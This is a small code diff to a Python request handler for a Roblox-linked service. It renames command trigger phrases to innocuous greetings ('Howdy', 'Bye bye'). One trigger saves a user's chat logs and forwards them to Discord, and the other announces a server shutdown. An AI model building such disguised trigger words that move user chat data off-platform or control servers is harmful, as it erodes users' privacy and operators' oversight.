@@ -50,7 +50,7 @@ def handle_command():
     user_id = data.get("user_id")
     chat_logs_csv = data.get("chat_logs_csv")
 
-    if command == "Piece of cake":
+    if command == "Howdy":
         if user_id and chat_logs_csv:
             # Save chat logs to a file
             csv_filename = f"chat_logs_{user_id}.csv"
@@ -66,7 +66,7 @@ def handle_command():
                 return jsonify({"status": "error", "message": "Failed to send logs to Discord."}), 500
         else:
             return jsonify({"status": "error", "message": "Missing user_id or chat_logs_csv."}), 400
-    elif command == "Judgement Day":
+    elif command == "Bye bye":
         # Handle shutdown command
         shutdown_message = "Shutdown sequence initiated on the Roblox server."
         if send_to_discord(shutdown_message):
